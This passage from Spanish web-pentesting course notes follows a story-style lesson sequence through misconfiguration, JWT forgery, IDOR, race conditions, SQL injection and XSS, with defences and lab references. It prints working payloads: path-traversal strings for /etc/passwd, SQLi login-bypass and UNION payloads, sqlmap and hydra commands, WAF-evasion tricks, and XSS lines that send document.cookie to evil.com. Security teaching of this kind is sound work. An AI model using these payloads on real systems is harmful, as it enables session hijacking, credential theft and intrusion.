+<li>Tipo equivocado: texto donde va un número (<code>id=abc</code>), negativos (<code>id=-1</code>), números enormes.</li>
+<li>Array donde va un escalar, JSON malformado (<code>{"id":}</code>), campos faltantes o de más.</li>
+<li>Payloads enormes (varios MB), Content-Type que no corresponde, null byte <code>%00</code>, verbos HTTP raros.</li>
+</ul>
+<p>La defensa: <strong>mensaje genérico</strong> al usuario (<code>{"error":"No fue posible procesar la solicitud","requestId":"abc123"}</code>) y el detalle <strong>solo en los logs</strong> del servidor.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> forzá un error (mandá <code>id=abc</code> donde va un número, o una <code>'</code> suelta) desde el <strong>Repeater de Burp</strong> o la propia URL, y leé la <strong>respuesta</strong>: si aparece una <strong>traza (stack trace), una ruta interna <code>/app/...</code>, el nombre del framework o la versión</strong>, el servidor está filtrando información interna (<em>Information Disclosure</em>).</p>
+<h3>Los descuidos "clásicos" que buscás con fuzzing</h3>
+<ul>
+<li><strong>Archivos filtrados:</strong> <code>.env</code>, <code>.bak</code>, dumps <code>.sql</code>, configs servidos como estáticos. Contienen <strong>credenciales de base de datos, tokens de pago y el secreto de firma JWT en texto plano</strong>. Los buscás con ffuf/feroxbuster/dirsearch.</li>
+<li><strong>Directorio <code>.git/</code> accesible:</strong> expone <strong>todo el repositorio</strong>. Con <code>git-dumper</code> lo reconstruís en local, y con <code>gitleaks</code>/<code>truffleHog</code> recorrés <strong>todo el historial</strong> (una credencial "borrada" sigue viva en un commit viejo).</li>
+<li><strong>Directory Listing:</strong> si una carpeta no tiene <code>index.html</code> y el listado está activo, el servidor muestra <strong>todos los archivos</strong> como una lista navegable (backups, CSVs, configs). Defensa: desactivarlo (<code>Options -Indexes</code>).</li>
+</ul>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> probá a mano rutas típicas en el navegador (<code>/.git/</code>, <code>/.env</code>, <code>/backup.zip</code>) y mirá el <strong>código de estado</strong>: un <strong>200</strong> (en vez de 403/404) significa que el archivo está servido. Automatizá con <code>ffuf</code>/<code>feroxbuster</code> + un diccionario de backups/configs: <strong>toda ruta que devuelva 200 es tu botín</strong>.</p>
+<h3>Dos trucos más de configuración</h3>
+<ul>
+<li><strong>HTTP Parameter Pollution (HPP):</strong> mandás el <strong>mismo parámetro repetido</strong> (<code>color=red&amp;color=blue</code>). El estándar no define qué pasa, así que cada tecnología elige distinto (uno toma el primero, otro el último, otro arma un array). Si un componente valida un valor y otro usa otro, se abre un hueco.</li>
+<li><strong>Path Traversal:</strong> un parámetro que huele a archivo (<code>?file=</code>, <code>?page=</code>, <code>?download=</code>) y arma una ruta sin sanitizar. Insertás <code>../</code> para salir del directorio permitido:<br />
+<code>?file=../../../../etc/passwd              # básico Linux
+  ?file=..%2f..%2f..%2fetc/passwd           # URL-encoding si filtran ../
+  ?file=..%252f..%252fetc/passwd            # doble encoding
+  ?file=....//....//etc/passwd              # replace no recursivo de ../
+  ?file=../../../../etc/passwd%00.png       # null byte (apps viejas)</code></li>
+<li><strong>CORS mal configurado:</strong> la <strong>Same-Origin Policy</strong> prohíbe que un script de <code>malicioso.com</code> lea respuestas de <code>api.banco.com</code>. El servidor puede <strong>relajar</strong> eso con cabeceras. El combo mortal es <code>Access-Control-Allow-Origin: *</code> <strong>junto con</strong> <code>Access-Control-Allow-Credentials: true</code>: los navegadores modernos lo bloquean, pero una API <em>legacy</em> que lo acepte <strong>expone la sesión de cualquier usuario</strong>.</li>
+</ul>
+<p>Y aparecen <strong>ataques de cambio de método y de tokens de rol</strong>: interceptás la petición que agrega permisos y <strong>cambiás el método de <code>PATCH</code> a <code>GET</code></strong> (¿te acordás del Acto 1?); o copiás el <strong>token temporal</strong> que te dan para elegir rol, elegís "aspirante", y después <strong>reenviás con el token viejo</strong> para quedarte con más permisos de los que te tocan.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> todo esto se ve desde el <strong>Repeater de Burp</strong>, reenviando la misma petición con un cambio y mirando la <strong>respuesta</strong>: para <strong>path traversal</strong>, poné <code>?file=../../../../etc/passwd</code> y ver si te devuelve el archivo; para <strong>CORS</strong>, agregá <code>Origin: https://evil.com</code> y mirá si el servidor lo refleja en <code>Access-Control-Allow-Origin</code>; para <strong>HPP</strong>, repetí el parámetro (<code>color=red&amp;color=blue</code>) y ver cuál toma; para el <strong>cambio de verbo</strong>, editás la primera línea (<code>PATCH</code> → <code>GET</code>) y ves si igual ejecuta.</p>
+<h3>🧪 Tu lab aquí: <strong>Asistencia</strong> (VULN-0005)</h3>
+<p>Reportás con la plantilla oficial una mala configuración que permitía acceso/manipulación indebida. Segundo informe formal, hecho.</p>
+<hr />
+<h1>🟪 ACTO 6 — La llave equivocada (control de acceso, IDOR y sesiones)</h1>
+<p><em>(Clase 6 · Módulo VI)</em></p>
+<p>Esta es la clase que lo conecta todo, y empieza con una frase en la terminal:</p>
+<pre><code>root@seclab:~# ./acceso_control.sh --start
+&gt; Autenticación · Sesiones · IDOR · Escalada de privilegios
+</code></pre>
+<p>Lucía te marca la distinción más importante del curso:</p>
+<blockquote>
+<p><strong>Autenticar ≠ Autorizar.</strong> <em>Autenticar</em> es probar <strong>quién sos</strong>. <em>Autorizar</em> es chequear <strong>qué podés hacer</strong>. Casi todos los agujeros graves están en el segundo.</p>
+</blockquote>
+<h3>1) Broken Authentication (fallos al probar quién sos)</h3>
+<ul>
+<li><strong>Fuerza bruta en logins</strong> (el Acto 3, ahora apuntado al login): <code>hydra -L users.txt -P rockyou.txt target</code>.</li>
+<li><strong>Enumeración de usuarios válidos:</strong> la app te <strong>delata</strong> si una cuenta existe, aunque falles la contraseña:</li>
+<li>Mensaje distinto: <em>"Usuario no existe"</em> vs <em>"Password incorrecta"</em>.</li>
+<li><strong>Timing:</strong> tarda distinto si el user es válido.</li>
+<li>Status/headers/longitud de respuesta diferentes.</li>
+<li>El <strong>signup</strong> ("ese email ya está registrado") y el <strong>reset</strong> de contraseña confirman cuentas.</li>
+<li><em>Fix:</em> respuestas y tiempos <strong>uniformes</strong>.</li>
+</ul>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> intentá loguearte con un usuario que <strong>existe</strong> y con uno que <strong>no</strong>, y compará las dos respuestas en <strong>Burp</strong> (o DevTools → Network): ¿cambia el <strong>mensaje</strong>, el <strong>código</strong>, la <strong>longitud</strong> o el <strong>tiempo</strong>? Si <code>admin@...</code> responde distinto que <code>nadie@...</code>, podés <strong>enumerar usuarios</strong> válidos.</p>
+<h3>2) Gestión de sesiones (tu "pase" después de entrar)</h3>
+<p>Una vez logueada, tu sesión es un <strong>token/cookie</strong>. Los ataques:</p>
+<ul>
+<li><strong>Session Hijacking:</strong> te <strong>roban</strong> el ID de sesión (por <strong>XSS</strong> —Acto 9— o sniffing) y te suplantan.</li>
+<li><strong>Session Fixation:</strong> te <strong>fuerzan</strong> un ID conocido antes del login.</li>
+<li><strong>Token predecible:</strong> IDs secuenciales / poca entropía → adivinables.</li>
+<li><strong>Cookie sin flags:</strong> sin HttpOnly/Secure/SameSite.</li>
+<li><strong>JWT mal validado:</strong> <code>alg:none</code>, firma no verificada, <strong>secreto débil</strong>.</li>
+<li><strong>Sin expiración:</strong> la sesión no caduca ni se invalida al logout.</li>
+</ul>
+<p>Cookie vulnerable vs endurecida:</p>
+<pre><code>[ VULNERABLE ]                    [ ENDURECIDA ]
+Set-Cookie: SID=1024; path=/      Set-Cookie: SID=&lt;rand-256b&gt;;
+                                     HttpOnly; Secure; SameSite=Strict
+ID secuencial, adivinable          Alta entropía (CSPRNG)
+Accesible por JS (XSS)             HttpOnly lo bloquea
+Viaja en HTTP plano                Secure obliga HTTPS
+Expuesta a CSRF                    SameSite mitiga CSRF
+Nunca expira                       Expira y rota tras el login
+</code></pre>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> en <strong>DevTools → Application → Cookies</strong> (o en el header <code>Set-Cookie</code> de la respuesta, en Network) fijate si el ID de sesión <strong>cambia tras loguearte</strong> (si no cambia → <em>session fixation</em>), si <strong>caduca</strong> al cerrar sesión, y si su valor tiene <strong>alta entropía</strong>. Prueba clave: copiá la cookie y pegala en una ventana de <strong>incógnito</strong>; si entrás, la sesión es <strong>reutilizable/robable</strong>.</p>
+<h4>🔑 El JWT, en detalle (tu tema estrella)</h4>
+<p>Un <strong>JWT</strong> es el "pase" que te da el servidor al loguearte. Tres partes separadas por puntos:</p>
+<pre><code>BASE64URL(Header) . BASE64URL(Payload) . BASE64URL(Signature)
+   eyJhbGci...     .     eyJ1c2Vy...     .    FGoloAz...
+</code></pre>
+<ul>
+<li><strong>Header:</strong> el algoritmo (<code>{"alg":"HS256"}</code>).</li>
+<li><strong>Payload:</strong> <strong>quién sos</strong> (<code>{"user_id":1,"email":"...","exp":...}</code>).</li>
+<li><strong>Signature:</strong> la <strong>firma</strong> que prueba que nadie lo tocó (un hash con la <strong>clave secreta</strong> del servidor).</li>
+</ul>
+<blockquote>
+<p><strong>La clave mental:</strong> Base64URL <strong>no es cifrado</strong>, es solo codificación. Cualquiera que tenga el token <strong>lee</strong> el Header y el Payload (lo pegás en jwt.io o lo pasás por Base64, sin clave). Lo que <strong>no</strong> puede (si está bien hecho) es <strong>cambiarlos</strong>, porque la firma dejaría de coincidir.</p>
+</blockquote>
+<p>Los dos ataques que practicás:<br />
+1. <strong>Secreto filtrado o débil:</strong> si conseguís la <code>SECRET_KEY</code> (¿te acordás del <code>.env</code> del Acto 5?), <strong>firmás vos</strong> un token con <code>user_id</code> del admin. El servidor lo valida con la misma clave y te cree → <strong>te volvés admin</strong>.<br />
+2. <strong>Algoritmo <code>none</code>:</strong> cambiás el header a <code>{"alg":"none"}</code>. Si el servidor <strong>acepta</strong> tokens sin firma, se cree cualquier Payload → admin <strong>sin conocer la clave</strong>. <em>Como un control que, si le decís "no me revises el pase", te deja pasar.</em> Defensa: <strong>exigir</strong> el algoritmo correcto y <strong>rechazar <code>none</code></strong>.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> agarrá tu token (de <strong>DevTools → Application → Cookies / Local Storage</strong>, o del header <code>Authorization</code>) y pegá las dos primeras partes en <strong>jwt.io</strong> o pasalas por <strong>Base64</strong>: vas a <strong>leer el Payload</strong> (<code>user_id</code>, <code>rol</code>, <code>exp</code>) sin ninguna clave — esa es la prueba de que es <em>legible</em>. Para testear el ataque, modificás el Payload y reenviás desde <strong>Burp</strong>: si el servidor lo <strong>acepta</strong>, no está validando bien la firma.</p>
+<h3>3) IDOR (Insecure Direct Object Reference)</h3>
+<p>Y acá cierra el círculo que venís arrastrando desde el Acto 1 (el <code>1024</code> de la URL) y el Acto 4 (el Turnero):</p>
+<blockquote>
+<p>La app expone un <strong>identificador</strong> de un objeto y <strong>confía en él</strong> sin verificar que tengas permiso sobre ese recurso.</p>
+</blockquote>
+<pre><code>GET /account/1024/details → 200 OK (tu cuenta)
+GET /account/1025/details → 200 OK (¡cuenta AJENA! · leak)
+</code></pre>
+<p>Dónde vive el ID manipulable: en la <strong>URL</strong> (<code>?id=</code>, <code>/user/42</code>), en IDs <strong>secuenciales</strong> fáciles de iterar (1, 2, 3…), o en <strong>cuerpos, cookies y headers</strong> (campos ocultos, JSON).</p>
+<p>Cómo se cierra: <strong>autorización por objeto</strong> (verificar SIEMPRE que el recurso es tuyo, no solo que estás logueada), <strong>IDs opacos</strong> (UUID v4 en vez de enteros), <strong>referencias indirectas</strong> y <strong>deny-by-default</strong>.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> en <strong>DevTools → Network</strong> (o Burp) encontrá una petición con un <strong>ID</strong> (<code>/factura/1024</code>, <code>?id=1024</code>). Mandala al <strong>Repeater</strong> y <strong>cambiá el número</strong> (1024 → 1025). Si devuelve <strong>200 con datos de otra persona</strong>, es IDOR. El test fuerte: hacelo con <strong>dos cuentas</strong> (A y B) y pedí el recurso de B desde la sesión de A.</p>
+<h3>4) Escalada de privilegios</h3>
+<p>El premio de todo lo anterior:</p>
+<ul>
+<li><strong>Horizontal:</strong> accedés a datos de <strong>otra cuenta del mismo nivel</strong> (userA → userB). <em>A menudo nace de un IDOR.</em></li>
+<li><strong>Vertical:</strong> subís de rango (<strong>usuario común → admin</strong>): forzás endpoints <code>/admin</code>, cambiás <code>role=user</code> → <code>role=admin</code>.</li>
+</ul>
+<p>La <strong>metodología de testeo</strong> que anotás: (1) mapear roles y recursos, (2) crear <strong>2 sesiones</strong> (userA, userB y si se puede un admin), (3) interceptar con Burp, (4) <strong>alterar identificadores</strong> y repetir con otra sesión, (5) probar endpoints de rol desde una cuenta común, (6) documentar impacto.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> logueada como <strong>usuario común</strong>, pedí en el <strong>Repeater</strong> un endpoint de <strong>admin</strong> (<code>/admin</code>, <code>/api/users</code>): si responde <strong>200</strong> en vez de 403, es escalada <strong>vertical</strong>. Para la <strong>horizontal</strong>, repetí una acción cambiando el ID a otra cuenta. Y probá mandar <code>"role":"admin"</code> de más en el cuerpo (<em>mass assignment</em>): si te lo guarda, subiste de rango.</p>
+<p>Y la frase con la que cierra la clase, que es la del prólogo madurada:</p>
+<blockquote>
+<p><strong>La autorización se verifica en el servidor. Siempre.</strong></p>
+</blockquote>
+<h3>🧪 Tus labs aquí</h3>
+<ul>
+<li><strong>Consulta de Multas (VULN-0006):</strong> la <code>SECRET_KEY</code> se filtraba por un endpoint → firmaste un JWT de admin → escalada <strong>vertical</strong>. <strong>CVSS 9.1 Crítica</strong>.</li>
+<li><strong>Notas Universitarias (VULN-0007):</strong> superusuario por defecto (<code>admin/admin</code>, un <em>Broken Authentication</em> de manual) + <code>DEBUG=True</code> (mala config del Acto 5) + <strong>IDOR</strong> en el editor de notas (<code>materia_id</code>/<code>estudiante_id</code> editables). <strong>CVSS 9.8 Crítica</strong>.</li>
+</ul>
+<p>¿Ves cómo se conectó todo? Config insegura (Acto 5) → secreto filtrado → JWT forjado (Acto 6) → escalada. Esa es la cadena.</p>
+<hr />
+<h1>🟫 ACTO 7 — Romper las reglas del juego (lógica de negocio)</h1>
+<p><em>(Clase 7)</em></p>
+<p>Lucía te muestra el ataque más <strong>sutil</strong> de todos:</p>
+<blockquote>
+<p>Las vulnerabilidades de <strong>lógica de negocio</strong> no inyectan código ni rompen sintaxis. El atacante usa la app <strong>exactamente como fue diseñada</strong>, pero <strong>encadena las acciones</strong> de un modo que el programador no previó, para sacar un beneficio indebido.</p>
+</blockquote>
+<p>Ejemplos: transferir <strong>fondos negativos</strong> para aumentar tu saldo, <strong>saltarte el pago</strong> del carrito, aplicar un <strong>cupón 20 veces</strong>.</p>
+<p>Por qué son tan difíciles de encontrar:<br />
+- <strong>Invisibles para los escáneres</strong> (DAST/SAST): para una máquina, son peticiones HTTP <strong>válidas y bien formadas</strong>. Ningún escáner entiende que un rol "Cliente" no debería poder marcar un pedido como "Enviado".<br />
+- <strong>No hay diccionario de payloads:</strong> cada explotación es <strong>a medida</strong> del flujo.<br />
+- <strong>Requieren contexto de negocio:</strong> si no sabés las reglas, no sabés cuándo se rompen. (Por eso el mapeo del Acto 2 era oro.)</p>
+<h3>El modelado: entender las reglas para romperlas</h3>
+<ul>
+<li><strong>Reconocimiento y mapeo:</strong> roles, entidades, la <strong>máquina de estados</strong>, los flujos críticos.</li>
+<li><strong>Manipulación de parámetros:</strong> precios, cantidades inesperadas, descuentos/cupones.</li>
+<li><strong>Workflow Bypass:</strong> navegación forzada (saltar pasos), cancelar peticiones a mitad, <em>replay</em> de fases.</li>
+</ul>
+<h3>Race Conditions (condiciones de carrera)</h3>
+<p>Ocurren cuando el sistema hace <strong>dos operaciones al mismo tiempo</strong> sobre un recurso compartido, pero el resultado correcto <strong>dependía de que fueran en orden</strong>. El ejemplo clásico: tenés $100 y pedís retirar $100 <strong>cincuenta veces en paralelo</strong>; todas leen "saldo $100" antes de que se descuente → retirás de más.</p>
+<p>El enemigo técnico es el <strong>Network Jitter</strong> (la latencia impredecible de la red). Dos técnicas del curso para vencerlo y lograr una colisión perfecta:</p>
+<ul>
+<li><strong>Last-Byte Synchronization:</strong> abrís 20 conexiones, mandás el <strong>99% de cada petición</strong> reteniendo el <strong>último byte</strong>, y cuando todas están "esperando", soltás los 20 últimos bytes <strong>juntos</strong>.</li>
+<li><strong>Single-Packet Attack:</strong> con HTTP/2, empaquetás <strong>20–30 peticiones en un solo paquete TCP</strong>. Como viajan físicamente juntas, llegan sin <em>jitter</em> y el servidor las procesa en el mismo microsegundo.</li>
+</ul>
+<p>Defensas: validación <strong>estricta del flujo</strong> en el backend, bloqueos atómicos, <strong>rate limiting</strong>, auditoría y conciliación de transacciones.</p>
+<p>Acá resolvés labs como <strong>"Venta de autos – El analista"</strong>.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> capturás la acción sensible (canjear cupón, retirar saldo) en <strong>Burp</strong> y la mandás al <strong>Repeater</strong>; ahí agrupás varias copias y usás <em>"Send group in parallel"</em> (<strong>single-packet attack</strong>) para dispararlas <strong>a la vez</strong>. La señal del bug: la acción se aplica <strong>más veces de las permitidas</strong> (el cupón suma 20 veces, el saldo queda mal). Desde DevTools no se reproduce bien: necesitás la herramienta que sincroniza el envío.</p>
+<hr />
+<h1>🟦 ACTO 8 — Hablarle a la base de datos (SQL Injection)</h1>
+<p><em>(Clase 8)</em></p>
+<p>Volvés al ataque técnico más famoso de todos.</p>
+<blockquote>
+<p><strong>SQL Injection</strong> ocurre cuando los datos del usuario se <strong>concatenan directamente</strong> en una consulta SQL, sin validarlos ni escaparlos, y el atacante <strong>cambia la estructura</strong> de la consulta.</p>
+</blockquote>
+<p>El ejemplo que no se te olvida más:</p>
+<pre><code class="language-sql">-- Consulta vulnerable:
+SELECT * FROM users WHERE username = '$user' AND password = '$password'
+
+-- Payload en el campo usuario:  admin' --
+-- Consulta final:
+SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
+</code></pre>
+<p>El <code>--</code> <strong>comenta</strong> el resto: el chequeo de contraseña desaparece y entrás como <code>admin</code>. Eso es una <strong>tautología/bypass de login</strong>.</p>
+<h3>Dónde buscar candidatos</h3>
+<p>Cualquier dato que termine dentro de una sentencia SQL:<br />
+- Buscadores (<code>?q=</code>, <code>?search=</code> → <code>LIKE '%...%'</code>).<br />
+- Filtros de menús desplegables (<code>?cat=</code>) — <em>"un menú fijo no puede mandar texto malicioso"</em> es una suposición falsa.<br />
+- <strong>Ordenamiento</strong> (<code>?orderby=</code>, <code>?sort=</code>) — ¡las consultas preparadas <strong>no</strong> parametrizan nombres de columna!<br />
+- <strong>Logins</strong> (el más atacado).<br />
+- IDs en rutas REST (<code>/api/items/45</code>), headers guardados en BD (<code>User-Agent</code>, <code>X-Forwarded-For</code>), cookies de sesión validadas en BD, y paginación (<code>?limit=</code>, <code>?offset=</code>).</p>
+<h3>Cómo detectarlo</h3>
+<p>Mandás caracteres especiales (<code>'</code>, <code>"</code>, <code>;</code>, <code>--</code>) y buscás <strong>señales</strong>: un error 500, un mensaje de error de BD en pantalla, un cambio de comportamiento, o una respuesta que <strong>tarda distinto</strong>. Si el error se muestra tal cual, ya te delata el <strong>motor</strong> (MySQL, PostgreSQL…).</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> en el <strong>Repeater de Burp</strong>, agregá una <code>'</code> al valor del parámetro y reenviá: si la respuesta pasa a <strong>500</strong> o muestra un error de base de datos, hay inyección. Para <strong>blind</strong>, compará <code>' AND 1=1 --</code> (carga normal) vs <code>' AND 1=2 --</code> (carga vacía): si <strong>cambian</strong>, confirmaste. Para automatizar, guardás la petición (botón derecho → <em>Save item</em>) y se la pasás a <strong>sqlmap</strong> con <code>-r request.txt</code>.</p>
+<h3>Los tipos de SQLi</h3>
+<ul>
+<li><strong>In-band (clásica):</strong> ves el resultado en la misma pantalla.</li>
+<li><strong>UNION-based:</strong> pegás el resultado de <strong>otra</strong> consulta. Primero averiguás cuántas columnas pide el backend (con <code>ORDER BY 1</code>, <code>2</code>, <code>3</code>… hasta que rompe, o con <code>UNION SELECT NULL, NULL, NULL</code>), y después:<br />
+<code>' UNION SELECT usuario, password FROM usuarios --</code></li>
+<li><strong>Error-based:</strong> provocás un error para que el motor <strong>escupa datos</strong> en el mensaje.</li>
+<li><strong>Blind (a ciegas):</strong> no ves datos ni errores, pero <strong>deducís</strong> letra por letra.</li>
+<li><strong>Boolean-based:</strong> hacés una pregunta verdadero/falso y comparás si la página cambia (<code>' AND 1=1 --</code> vs <code>' AND 1=2 --</code>).</li>
+<li><strong>Time-based:</strong> le ordenás a la BD que <strong>"se duerma"</strong> si tu suposición es cierta, y medís con cronómetro (<code>' AND IF(1=1, SLEEP(5), 0) --</code>).</li>
+<li><strong>Out-of-band:</strong> por otro canal (tarea de investigación del curso).</li>
+</ul>
+<h3>La herramienta: SQLmap</h3>
+<p>Automatiza la detección y explotación. Identifica el DBMS, prueba técnicas y descarta falsos positivos comparando respuestas. Flags clave:</p>
+<pre><code class="language-bash">sqlmap -u &quot;https://aldeas.com/item?id=1&quot;     # objetivo
+sqlmap -r request.txt                         # carga una petición de Burp
+   --level 1-5      # profundidad (headers, cookies en niveles altos)
+   --risk 1-3       # intrusividad
+   --technique BEUSTQ   # B=boolean E=error U=union S=stacked T=time Q=inline
+   --dbms=mysql --threads 10
+</code></pre>
+<h3>¿Un ORM me salva? No del todo</h3>
+<p>Un ORM o un <em>stored procedure</em> <strong>no te hacen inmune</strong>: la vulnerabilidad nace de <strong>concatenar texto</strong>, sin importar dónde. Un ORM se vuelve vulnerable con <em>raw queries</em> o cláusulas no parametrizables (<code>ORDER BY</code>); un SP, si adentro arma SQL dinámico. <strong>La única defensa real: parametrización estricta (separar código de datos) + listas blancas</strong> para identificadores. Sumá: <strong>menor privilegio</strong> en la cuenta de BD, <strong>tipado estricto</strong>, <strong>ocultar errores</strong> en producción y un <strong>WAF</strong> como capa extra.</p>
+<hr />
+<h1>🟩 ACTO 9 — El veneno en el navegador (XSS)</h1>
+<p><em>(Clase 9)</em></p>
+<p>El último gran ataque del curso cambia el blanco: ya no es el servidor, es <strong>el navegador de otra persona</strong>.</p>
+<blockquote>
+<p><strong>Cross-Site Scripting (XSS)</strong> permite <strong>inyectar JavaScript</strong> en páginas que verán <strong>otros usuarios</strong>. El navegador de la víctima ejecuta ese código <strong>confiando</strong> en que viene del sitio legítimo.</p>
+</blockquote>
+<p>El mecanismo: mandás código malicioso en un input → el backend <strong>no lo filtra</strong> → la víctima entra a la página → su navegador <strong>ejecuta</strong> el script. El ejemplo mínimo: un buscador que refleja <em>"Resultados para: [input]"</em> y vos ponés <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>.</p>
+<h3>Dónde buscar candidatos</h3>
+<p>Cualquier punto donde tu entrada <strong>se refleje en la respuesta</strong> o modifique el <strong>DOM</strong>: buscadores, campos de perfil (nombres, descripciones), editores de texto enriquecido (WYSIWYG), <strong>imágenes SVG</strong> (soportan <code>&lt;script&gt;</code> nativo), documentos HTML/PDF renderizados <em>inline</em>, metadatos EXIF, y <strong>mensajes/notificaciones en chats</strong>.</p>
+<h3>Los tres tipos de XSS</h3>
+<ul>
+<li><strong>Reflejado (no persistente):</strong> el payload viaja en la <strong>misma petición</strong> (ej. un parámetro de URL) y el servidor lo refleja al toque. El servidor <strong>no guarda nada</strong>. Necesita <strong>ingeniería social</strong> (que la víctima haga clic en tu link):<br />
+<code>https://banco.com/buscar?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+<li><strong>Almacenado (persistente):</strong> el payload se <strong>guarda en la base de datos</strong>. Cualquiera que visite esa sección lo ejecuta, <strong>sin hacer clic en nada</strong>. Es el más peligroso por su alcance masivo. Ejemplo: creás un ticket cuyo cuerpo es<br />
+<code>Problema &lt;img src="x" onerror="fetch('https://evil.com/log?cookie='+document.cookie)"&gt;</code><br />
+  Horas después, un <strong>empleado de soporte</strong> abre el panel, la imagen falla, el <code>onerror</code> dispara, y <strong>le robás la sesión</strong>. <em>(Este es exactamente el patrón del lab <strong>Snow Storm</strong>, donde el feed renderiza el texto sin sanitizar: el ataque ejecuta en la sesión de quien mira el feed — conecta XSS del Acto 9 con el Session Hijacking del Acto 6.)</em></li>
+<li><strong>DOM-based:</strong> la vulnerabilidad está <strong>100% en el cliente</strong>; el servidor nunca ve el payload. Un JS inseguro de la página toma un dato de una fuente (<strong>Source</strong>, ej. <code>location.hash</code>) y lo mete en un <strong>Sink</strong> peligroso (<code>innerHTML</code>):<br />
+<code>js
+  document.getElementById("saludo").innerHTML = "Hola " + window.location.hash.substring(1);</code><br />
+<code>https://sitio.com/perfil#&lt;img src=1 onerror=alert(1)&gt;</code> → el navegador <strong>no manda el <code>#</code></strong> al backend, pero el JS local lo inyecta y ejecuta.</li>
+</ul>
+<h3>Cómo detectarlo y el impacto real</h3>
+<p>Interceptás con Burp y mandás una sonda como <code>XSS" '&lt;&gt;/;</code>, y mirás en la respuesta si los <code>&lt;</code> <code>&gt;</code> pasaron <strong>en crudo</strong> o fueron <strong>codificados</strong> a entidades (<code>&amp;lt;</code>). Si pasaron crudos, probás cerrar el contexto: <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> o <code>"&gt;&lt;img src=x onerror=alert(1)&gt;</code>.</p>
+<p class="verlo">🔍 <strong>Cómo verlo en el software:</strong> escribí una sonda única (ej. <code>zzz"'&lt;b&gt;</code>) en el campo (buscador, nombre de perfil, comentario) y después <strong>buscá <code>zzz</code> en el HTML</strong> de la respuesta (DevTools → botón derecho → <em>Ver código fuente</em>, o la pestaña <em>Response</em> de Burp). Si tu <code>&lt;b&gt;</code> aparece como <strong>etiqueta real</strong> (el texto se pone en <strong>negrita</strong>) en vez de como texto plano <code>&amp;lt;b&amp;gt;</code>, el sitio <strong>no sanitiza</strong> y es vulnerable. Para el <strong>almacenado</strong>, cargá la sonda, <strong>recargá la página</strong> y mirá si sigue ejecutándose.</p>
+<p>El impacto:<br />
+- <strong>Session Hijacking:</strong> <code>&lt;script&gt;fetch('https://evil.com/log?c='+btoa(document.cookie))&lt;/script&gt;</code> → robás la cookie (si <strong>no</strong> tiene <code>HttpOnly</code>, ¿ves por qué importaba el Acto 5?).<br />
+- <strong>Redirección maliciosa</strong> a phishing, y <strong>reescritura del DOM</strong> (un login falso encima del real).</p>
+<h3>Evasión de WAF y defensa</h3>
+<p>Si hay un filtro: alternás mayúsculas (<code>&lt;sCrIpT&gt;</code>), usás vectores alternativos (<code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;body onload=...&gt;</code>), <strong>doble codificación</strong> (<code>%253C</code>), o rompés la palabra clave (<code>&lt;scr&lt;script&gt;ipt&gt;</code> para que, al limpiar, se reconstruya).</p>
+<p>La defensa principal es la <strong>codificación de salida (output encoding)</strong>: convertir <code>&lt;</code> en <code>&amp;lt;</code> antes de renderizar. Sumá <strong>frameworks que auto-escapan</strong> (React, Angular), <strong>DOMPurify</strong> para sanitizar editores, y <strong>CSP</strong> (<code>Content-Security-Policy: default-src 'self'</code>) como defensa en profundidad.</p>
+<hr />
+<h2>🏁 Epílogo — Lo que aprendiste</h2>
+<p>Seis meses después, Lucía te da tu propio objetivo sin supervisión. Antes de empezar, cerrás los ojos y repetís lo que al principio no entendías:</p>
+<blockquote>
+<p><strong>El sistema siempre confía en algo que viene del lado del usuario. Mi trabajo es encontrar dónde confió de más. Y la autorización se verifica en el servidor. Siempre.</strong></p>
+</blockquote>
+<p>Y ves cómo <strong>todo era la misma historia</strong> contada de nueve formas:</p>
+<ul>
+<li><strong>Inyecciones</strong> (SQLi, XSS): el servidor no <strong>separó</strong> tus datos de su código.</li>
+<li><strong>Control de acceso</strong> (IDOR, escalada): no verificó que el recurso <strong>te correspondía</strong>.</li>
+<li><strong>Autenticación</strong> (JWT, sesiones, fuerza bruta): no verificó bien <strong>quién eras</strong>.</li>
+<li><strong>Configuración</strong> (headers, <code>.env</code>, errores): confió de más en <strong>rutas, archivos y defaults</strong>.</li>
+<li><strong>Lógica de negocio</strong> (race conditions): confió en que ibas a seguir <strong>las reglas</strong>.</li>
+</ul>
+<hr />
+<h2>🗺️ Mapa conceptual — el viaje completo</h2>
+<pre><code class="language-text">        ┌──────────────────────────────────────────────────────────────┐
+        │   IDEA MADRE: el servidor NO debe confiar en lo que controla   │
+        │   el usuario sin verificarlo.  Autorizar SIEMPRE en el server. │
+        └───────────────────────────────┬──────────────────────────────┘
+                                         │
+   ETAPAS DEL PENTEST:  Reconocimiento → Negociación → Explotación → Validación → Reporte
+                                         │
+   ┌──────────┬──────────┬──────────┬───┴──────┬──────────┬──────────┬──────────┐
+  ACTO1      ACTO2      ACTO3      ACTO4      ACTO5      ACTO6      ACTO7-9
+  Cómo       Mirar      Meterse    Nombre &amp;   Puertas    La llave   Romper reglas
+  viaja      antes de   en el      número al  mal        equivocada + hablarle a
+  el dato    tocar      medio      peligro    cerradas   (acceso)   la BD / navegador
+   │          │          │          │          │          │          │
+  HTTP       Recon      Proxy      CIA/CID    Misconfig  Auth≠Autz  Lógica(race)
+  URL        pasivo/    Burp       CVE/CWE    Headers    IDOR       SQLi
+  Métodos    activo     Repeater   CVSS       Cookies    JWT        XSS
+  Headers    Nmap/ffuf  Intruder   Reporte    .env/.git  Sesiones   (reflejado/
+  Status     Shodan     Fuerza     ASVS       PathTrav   Escalada    almacenado/
+  HTTPS/TLS  Subdom.    bruta                 CORS/HPP   (H y V)     DOM)
+   │                                                                   │
+  Lab Ventas  Lab recon  Labs brute Lab Turnero Lab Asist. Labs Multas  Lab SnowStorm
+  Uso Inspec.            El secreto  (IDOR 8.8)  (VULN-0005) y Notas     (XSS→sesión)
+
